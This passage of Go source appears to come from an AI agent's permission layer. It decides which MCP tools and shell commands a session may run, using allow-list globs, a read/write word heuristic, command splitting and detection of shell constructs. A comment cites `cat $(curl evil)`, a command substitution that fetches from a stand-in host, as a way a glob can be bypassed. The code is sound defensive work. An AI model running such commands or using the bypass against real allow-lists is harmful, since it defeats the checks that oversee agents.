			begin(i)
			cur.WriteByte(ch)
		}
	}
	flush(len(segment))
	return out
}

// decideMCP applies permissions.mcp when the workspace configured it, and
// the write-verb heuristic when it did not. Both answers come out of
// DecideMCPTool, which is also what `sirdar mcp tools` reports: one
// function, so a verdict read without a run is the verdict a run gets.
func (p *PermissionPolicy) decideMCP(tool string) Decision {
	v := DecideMCPTool(tool, p.MCPAllow)
	switch {
	case v.Allow:
		return Decision{Allow: true}
	case v.Rule == MCPRuleNotListed:
		return Decision{Allow: false, Message: "Sirdar policy: MCP tool " + tool +
			" is not in permissions.mcp (" + v.Detail + ")"}
	default:
		return Decision{Allow: false, Message: "Sirdar policy: MCP tool " + tool +
			" looks like a write and is not in permissions.mcp"}
	}
}

// MCPRule names the rule that settled an MCP tool's verdict, so a caller
// can say more than allowed/denied without deriving the decision a second
// time from the tool name.
type MCPRule string

const (
	// MCPRulePattern allowed the tool: Detail is the permissions.mcp
	// pattern it matched.
	MCPRulePattern MCPRule = "pattern"
	// MCPRuleNotListed denied it: permissions.mcp is non-empty and no
	// pattern in it matched. Detail is that list, comma-separated.
	MCPRuleNotListed MCPRule = "not-listed"
	// MCPRuleWriteWord denied it: Detail is the write word in its name.
	MCPRuleWriteWord MCPRule = "write-word"
	// MCPRulePassthrough denied it: Detail is the word that makes the name
	// describe a transport rather than an operation.
	MCPRulePassthrough MCPRule = "passthrough"
	// MCPRuleUnrecognised denied it: the name carries no read word at all,
	// so nothing in it says the call only reads.
	MCPRuleUnrecognised MCPRule = "unrecognised"
	// MCPRuleReadWord allowed it: Detail is the read word, with no write
	// or passthrough word beside it.
	MCPRuleReadWord MCPRule = "read-word"
)

// MCPVerdict is the whole answer about one MCP tool: the decision a run
// would get, the rule that settled it, and the pattern or word that rule
// turned on.
type MCPVerdict struct {
	Allow  bool
	Rule   MCPRule
	Detail string
}

// Reason renders the verdict as the sentence `sirdar mcp tools` prints
// beside a tool and the API returns in its reason field.
func (v MCPVerdict) Reason() string {
	switch v.Rule {
	case MCPRulePattern:
		return "matched permissions.mcp pattern " + strconv.Quote(v.Detail)
	case MCPRuleNotListed:
		return "not in permissions.mcp (" + v.Detail + ")"
	case MCPRuleWriteWord:
		return "write word " + strconv.Quote(v.Detail) + " in the name"
	case MCPRulePassthrough:
		return "generic passthrough: " + strconv.Quote(v.Detail) +
			" names a transport, so the arguments decide what the call does"
	case MCPRuleUnrecognised:
		return "no read word in the name, so nothing in it says the call only reads"
	case MCPRuleReadWord:
		return "read word " + strconv.Quote(v.Detail) + ", with no write word beside it"
	default:
		return string(v.Rule)
	}
}

// DecideMCPTool answers for one namespaced tool name (mcp__server__tool)
// under one permissions.mcp allow-list, exactly as a run's policy does: a
// non-empty allow-list is the whole rule, an empty one falls back to the
// name heuristic. PermissionPolicy.Decide and `sirdar mcp tools` both go
// through here, so what an operator is shown and what a session is given
// cannot drift apart.
func DecideMCPTool(tool string, allow []string) MCPVerdict {
	if len(allow) > 0 {
		for _, pattern := range allow {
			if MatchGlob(pattern, tool) {
				return MCPVerdict{Allow: true, Rule: MCPRulePattern, Detail: pattern}
			}
		}
		return MCPVerdict{Rule: MCPRuleNotListed, Detail: strings.Join(allow, ", ")}
	}
	return mcpNameVerdict(tool)
}

// MCPLooksLikeWrite reports whether an MCP tool's name describes anything
// but a read. The segment tested is everything after the last "__", so the
// server name — which may itself contain underscores, as in
// mcp__plugin_vercel_vercel__buy_domain — is never what is judged.
//
// The whole segment is tokenised, on "_", "-", "." and camelCase boundaries, and
// every token is tested. Servers put the verb wherever reads well
// (mcp__athena__wiki_save), so a rule that read the leading word alone
// missed those, and one that let a read word win approved run_query
// alongside grafana_api_request. The order is: any write word makes it a
// write, even beside a read word -- a read word does not save a name that
// also carries one; a generically named passthrough (..._api_request,
// graphql, sql_execute) is a write, because its arguments decide what it
// does and the name cannot say; only then does a read word make it a read.
// A name with none of the above -- carrying no read word at all -- is a
// write too: alerting_manage_rules used to fall through here and be
// approved for want of a recognised verb, which is the finding this tail
// case exists to close. Only a name whose words are all read or
// otherwise-neutral (no write, no passthrough, and at least one read word
// among them) comes back as a read.
//
// This denies query tools named run_* and exec_*, and now also denies any
// name the word lists do not recognise at all -- javascript_tool,
// generate_deeplink, next_departures. That is the trade: the heuristic
// fails closed for a workspace that configured nothing, and
// permissions.mcp is how a workspace that needs one of these says so.
func MCPLooksLikeWrite(tool string) bool {
	return !mcpNameVerdict(tool).Allow
}

// mcpNameVerdict is MCPLooksLikeWrite with its reasoning kept: the rule
// that decided and the word that rule turned on. MCPLooksLikeWrite is the
// boolean view of the same walk, so the two cannot disagree.
func mcpNameVerdict(tool string) MCPVerdict {
	words := mcpNameWords(tool)

	for _, w := range words {
		if mcpWriteVerbs[w] {
			return MCPVerdict{Rule: MCPRuleWriteWord, Detail: w}
		}
	}
	for _, w := range words {
		if mcpPassthroughWords[w] {
			return MCPVerdict{Rule: MCPRulePassthrough, Detail: w}
		}
	}
	// A tool called nothing but "query" names no object to query, which is
	// the same generic passthrough an api_request is.
	if len(words) == 1 && words[0] == "query" {
		return MCPVerdict{Rule: MCPRulePassthrough, Detail: "query"}
	}
	for _, w := range words {
		if mcpReadWords[w] {
			return MCPVerdict{Allow: true, Rule: MCPRuleReadWord, Detail: w}
		}
	}
	// No write word, no passthrough word, and no read word either: the name
	// says nothing this heuristic recognises, so it is judged a write
	// rather than approved unseen. A workspace that knows better names the
	// tool in permissions.mcp.
	return MCPVerdict{Rule: MCPRuleUnrecognised}
}

// mcpNameWords splits an MCP tool's own name segment into lower-case
// words, on "__", "_", "-", "." and camelCase boundaries.
func mcpNameWords(tool string) []string {
	name := tool
	if i := strings.LastIndex(tool, "__"); i >= 0 {
		name = tool[i+2:]
	}
	name = strings.ToLower(camelBoundary.ReplaceAllString(name, "${1}_${2}"))
	return strings.FieldsFunc(name, func(r rune) bool { return r == '_' || r == '-' || r == '.' })
}

// SplitCommand splits a shell command into the segments a policy has to
// approve one by one: the parts either side of |, ||, && and ;. Separators
// inside single or double quotes are text, not separators.
func SplitCommand(command string) []string {
	var segments []string
	var cur strings.Builder
	quote := byte(0)

	flush := func() {
		if s := strings.TrimSpace(cur.String()); s != "" {
			segments = append(segments, s)
		}
		cur.Reset()
	}

	for i := 0; i < len(command); i++ {
		ch := command[i]
		switch {
		case quote != 0:
			cur.WriteByte(ch)
			if ch == '\\' && quote == '"' && i+1 < len(command) {
				i++
				cur.WriteByte(command[i])
				continue
			}
			if ch == quote {
				quote = 0
			}
		case ch == '\'' || ch == '"':
			quote = ch
			cur.WriteByte(ch)
		case ch == '\\' && i+1 < len(command):
			cur.WriteByte(ch)
			i++
			cur.WriteByte(command[i])
		case ch == ';' || ch == '\n':
			flush()
		case ch == '|':
			if i+1 < len(command) && command[i+1] == '|' {
				i++
			}
			flush()
		case ch == '&':
			// "&&" separates, and so does a lone "&", which backgrounds
			// the segment before it. An "&" that belongs to a redirection
			// — 2>&1, >&2, &> — is part of its command, and splitting
			// there cut `which ffmpeg 2>&1` into "which ffmpeg 2>" and
			// "1", neither of which any allow-list pattern matches.
			if isRedirectAmp(command, i, lastNonSpace(cur.String())) {
				cur.WriteByte(ch)
				break
			}
			if i+1 < len(command) && command[i+1] == '&' {
				i++
			}
			flush()
		default:
			cur.WriteByte(ch)
		}
	}
	flush()
	return segments
}

func quote(s string) string { return `"` + s + `"` }

// lastNonSpace is the last character of s that is not a blank, or 0 when
// there is none.
func lastNonSpace(s string) byte {
	for i := len(s) - 1; i >= 0; i-- {
		if s[i] != ' ' && s[i] != '\t' {
			return s[i]
		}
	}
	return 0
}

func isBlank(b byte) bool { return b == ' ' || b == '\t' }

// isRedirectAmp reports whether the "&" at index i is part of a redirection
// (2>&1, >&2, &>file) rather than a command separator.
func isRedirectAmp(command string, i int, prev byte) bool {
	if prev == '>' {
		return true
	}
	if i+1 >= len(command) {
		return false
	}
	next := command[i+1]
	return next == '>' || (next >= '0' && next <= '9')
}

// allowedRedirects are the only redirections a read-only run approves.
// Sending stderr to stdout or to /dev/null writes nothing and is how an
// agent habitually quiets a probe (`which ffmpeg 2>/dev/null`); every other
// target is a file the run would be creating.
var allowedRedirects = []string{"2>&1", "2>/dev/null"}

// shellConstructs are the constructs an allow-list cannot see through,
// longest and most specific first so the reason names the right one. A
// glob approves the text of a command, and `cat go.mod > /tmp/x` or
// `cat $(curl evil)` would pass a `cat *` pattern while doing something
// the pattern never described.
var shellConstructs = []struct{ token, name string }{
	{"$(", "the command substitution $("},
	{"`", "a backtick command substitution"},
	{"<(", "the process substitution <("},
	{"&>", "the redirection &>"},
	{">>", "the redirection >>"},
	{">", "the redirection >"},
	{"<", "the redirection <"},
}

// ShellConstruct names the first unapproved shell construct in command, or
// returns "" when there is none. Occurrences inside single or double
// quotes are literal text — `rg "a>b"` searches for a string — and are not
// reported.
func ShellConstruct(command string) string {
	mask := maskQuoted(command)
	blankAllowedRedirects(mask)
	masked := string(mask)
	for _, c := range shellConstructs {
		if strings.Contains(masked, c.token) {
			return c.name
		}
	}
	return ""
}

// maskQuoted returns a copy of command with every quoted or escaped
// character (and the quotes themselves) replaced by a letter, so scanning
// for an operator finds only the ones the shell would act on. Indexes are
// preserved: the copy is the same length as the input.
func maskQuoted(command string) []byte {
	out := []byte(command)
	quote := byte(0)
	for i := 0; i < len(command); i++ {
		ch := command[i]
		switch {
		case quote != 0:
			if ch == '\\' && quote == '"' && i+1 < len(command) {
				out[i], out[i+1] = 'x', 'x'
				i++
				continue
			}
			if ch == quote {
				quote = 0
			}
			out[i] = 'x'
		case ch == '\'' || ch == '"':
			quote = ch
			out[i] = 'x'
		case ch == '\\' && i+1 < len(command):
			out[i], out[i+1] = 'x', 'x'
			i++
		}
	}
	return out
}

// blankAllowedRedirects erases the stderr redirections a run may use, so
// the scan that follows sees only the ones it has to refuse. Only a whole
// token counts: `2>/dev/null2` is not one of them.
func blankAllowedRedirects(mask []byte) {
	masked := string(mask)
	for _, tok := range allowedRedirects {
		for at := 0; at <= len(masked)-len(tok); {
			i := strings.Index(masked[at:], tok)
			if i < 0 {
				break
			}
			i += at
			at = i + len(tok)
			if i > 0 && !isBlank(mask[i-1]) {
				continue
			}
			if end := i + len(tok); end < len(mask) && !isBlank(mask[end]) {
				continue
			}
			for k := i; k < i+len(tok); k++ {
				mask[k] = ' '
			}
		}
	}
}

// MatchGlob reports whether command matches pattern, where '*' matches any
// run of characters including spaces and '/', and '?' matches exactly one
// character. Matching is case-sensitive and anchored to the full string.
//
// A pattern ending in " *" reads as "with any arguments", and matches the
// bare command too: "ls *" allows both `ls -la` and `ls`. Without that,
// splitting a compound command into segments would allow `ls -la` and
// refuse the `ls` next to it, which is not a distinction anyone can act on.
func MatchGlob(pattern, command string) bool {
	if bare, ok := strings.CutSuffix(pattern, " *"); ok && command == bare {
		return true
	}
	var b strings.Builder
	b.WriteByte('^')
	for _, r := range pattern {
		switch r {
		case '*':
			b.WriteString(".*")
		case '?':
			b.WriteByte('.')
		default:
			b.WriteString(regexp.QuoteMeta(string(r)))
		}
	}
	b.WriteByte('$')
	re, err := regexp.Compile(b.String())
	if err != nil {
		return false
	}
	return re.MatchString(command)
}
